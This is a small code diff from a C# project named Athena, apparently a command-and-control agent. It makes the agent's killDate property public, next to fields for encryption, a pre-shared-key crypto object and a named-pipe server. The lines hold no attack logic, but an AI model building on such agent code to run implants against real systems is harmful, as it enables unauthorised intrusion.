@@ -29,7 +29,7 @@ namespace Athena
         private bool connected { get; set; }
         public bool encrypted { get; set; }
         public bool encryptedExchangeCheck = bool.Parse("false");
-        private DateTime killDate { get; set; }
+        public DateTime killDate { get; set; }
         private PipeServer<DelegateMessage> serverPipe { get; set; }
         public PSKCrypto crypt { get; set; }
         //public BlockingCollection<DelegateMessage> queueIn { get; set; }
